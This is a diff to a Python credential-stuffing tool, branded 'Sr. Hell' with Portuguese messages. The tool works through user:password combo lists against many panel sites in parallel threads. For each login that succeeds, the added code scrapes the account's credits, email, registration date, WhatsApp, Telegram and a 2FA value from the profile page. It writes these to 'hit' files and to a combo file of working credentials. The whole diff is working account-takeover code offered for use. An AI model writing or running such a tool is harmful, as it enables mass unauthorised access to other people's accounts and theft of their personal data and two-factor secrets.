@@ -99,6 +99,100 @@ def save_data(nhost, user, password, credits, email, registration_date, twofa, w
     combo_path = f"{base_path}/Sr.Hell@COMBO(U&P).txt"
 
     # Verificar e remover duplicatas
+    if os.path.exists(file_path):
+        with open(file_path, "r") as f:
+            lines = f.readlines()
+        with open(file_path, "w") as f:
+            seen = set()
+            for line in lines:
+                if line not in seen:
+                    f.write(line)
+                    seen.add(line)
+
+    with open(file_path, "a") as f:
+        f.write(f"\n╼╾ Sr. Hell ╼╾\n")
+        f.write(f"╼╾ Universal 𝐏𝐚𝐢𝐧𝐞𝐥 ╼╾\n")
+        f.write(f"𝐔𝐒𝐄𝐑: {user}\n")
+        f.write(f"𝐏𝐀𝐒𝐒: {password}\n")
+        f.write(f"╼╾ 𝐢𝐧𝐟𝐨 ╼╾\n")
+        f.write(f"𝐂𝐑𝐄𝐃𝐈𝐓𝐎𝐒: {credits}\n")
+        f.write(f"╼╼╼╼╼╼╼╼╼╼╼\n")
+        f.write(f"╼ˢᶜʳⁱᵖᵗ ᵇʸ ˢʳ ᴴᵉˡˡ╾\n")
+
+    if os.path.exists(combo_path):
+        with open(combo_path, "r") as f:
+            lines = f.readlines()
+        with open(combo_path, "w") as f:
+            seen = set()
+            for line in lines:
+                if line not in seen:
+                    f.write(line)
+                    seen.add(line)
+
+    with open(combo_path, "a") as f:
+        f.write(f"{user}:{password}\n")
+
+def print_valid_login(nhost, user, password, credits):
+    print(Fore.GREEN + f"𝐒𝐈𝐓𝐄: {nhost}")
+    print(Fore.GREEN + f"𝐔𝐒𝐄𝐑: {user}")
+    print(Fore.GREEN + f"𝐏𝐀𝐒𝐒: {password}")
+    print(Fore.GREEN + f"╼╾ 𝐢𝐧𝐟𝐨 ╼╾")
+    print(Fore.GREEN + f"𝐂𝐑𝐄𝐃𝐈𝐓𝐎𝐒: {credits}")
+
+def worker(combo, nhost):
+    try:
+        user, password = combo.strip().split(':')
+        thread_login(nhost, user, password)
+    except ValueError:
+        pass
+
+def process_site(nhost, combos_data):
+    print(f"{Fore.CYAN}Iniciando verificação do site: {nhost}")
+    with ThreadPoolExecutor(max_workers=THREADS_PER_SITE) as executor:
+        futures = [executor.submit(worker, combo, nhost) for combo in combos_data]
+        for future in as_completed(futures):
+            future.result()
+    print(f"{Fore.CYAN}Verificação concluída para o site: {nhost}")
+
+def site_worker(site_queue, combos_data):
+    while True:
+        try:
+            nhost = site_queue.get_nowait()
+            process_site(nhost, combos_data)
+        except queue.Empty:
+            break
+        finally:
+            site_queue.task_done()
+
+def thread_login(nhost, user, password):
+    cookies = login(nhost, user, password)
+    if cookies:
+        dashboard_data = get_dashboard_data(nhost, cookies)
+        profile_data = get_profile_data(nhost, cookies)
+
+        credits = re.search(r'badge-info credits_badge\">Créditos: (\d+)', dashboard_data)
+        credits = credits.group(1) if credits else "N/A"
+
+        email = re.search(r'E-mail\" value=\"([^\"]+)\"', profile_data)
+        email = email.group(1) if email else "N/A"
+
+        registration_date = re.search(r'date_registered\" class=\"form-control\" value=\"([^\"]+)\"', profile_data)
+        registration_date = registration_date.group(1) if registration_date else "N/A"
+
+        whatsapp = re.search(r'name=\"whatsapp\" class=\"form-control\" placeholder=\"WhatsApp\" value=\"([^\"]+)\"', profile_data)
+        whatsapp = whatsapp.group(1) if whatsapp else "N/A"
+
+        telegram = re.search(r'name=\"telegram\" class=\"form-control\" placeholder=\"Telegram\" value=\"([^\"]+)\"', profile_data)
+        telegram = telegram.group(1) if telegram else "N/A"
+
+        twofa = re.search(r'<input type=\"text\" readonly class=\"form-control\" value=\"([^\"]+)\"', profile_data)
+        twofa = twofa.group(1) if twofa else "N/A"
+
+        save_data(nhost, user, password, credits, email, registration_date, twofa, whatsapp, telegram)
+        print_valid_login(nhost, user, password, credits)
+    else:
+        print(f"{Fore.RED}Login falhou para [{user}]:[{password}] no site {nhost}")
+
 def manage_sites(sites, combos_data):
     site_queue = queue.Queue()
     for site in sites:
